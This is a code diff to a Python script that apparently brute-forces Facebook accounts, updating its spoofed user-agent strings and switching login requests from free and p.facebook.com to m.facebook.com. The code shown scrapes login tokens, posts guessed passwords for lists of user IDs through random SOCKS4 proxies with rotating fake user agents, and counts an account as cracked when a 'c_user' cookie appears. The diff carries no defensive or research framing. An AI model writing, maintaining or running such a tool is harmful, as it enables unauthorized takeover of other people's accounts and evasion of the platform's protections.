@@ -338,7 +338,7 @@ elif '15' in version:
     ipsw = '19'+random.choice(abv)+str(random.randint(11,99))
 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
 application_version_code=str(random.randint(000000000,999999999))
-ua_ios = 'Mozilla/5.0 (iPhone, CPU iPhone '+version+'_'+osv+' like Mac OS '+version+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+ipsw+' [FBAN/FBIOS;FBAV/'+application_version+';FBBV/'+application_version_code+';FBDV/'+version+'.'+osv+';FBMD/iPhone;FBSN/iOS;FBSV/'+version+'.'+osv+';FBSS/2;FBCR/Reliance JIO;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS;]'
+ua_ios = 'Mozilla/5.0 (Linux; Android 10; JSN-L21 Build/HONORJSN-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]'
 def ffb(ids,names,passlist):
 	global loop,oks,cps
 	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.ZEE\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
@@ -648,7 +648,7 @@ def fcrack(uid,pwx,tl):
 			ua = random.choice(ugen)
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			free_fb = session.get('https://free.facebook.com').text
+			free_fb = session.get('https://m.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -659,7 +659,7 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'p.facebook.com',
+			header_freefb = {'authority':'m.facebook.com',
 			'upgrade-insecure-requests': '1',
 			'viewport-width': '980',
 			'method': 'GET',
@@ -678,7 +678,7 @@ def fcrack(uid,pwx,tl):
 			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Windows"',
 			"sec-ch-prefers-color-scheme": "light",
 			'user-agent': ua}
-			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+			lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
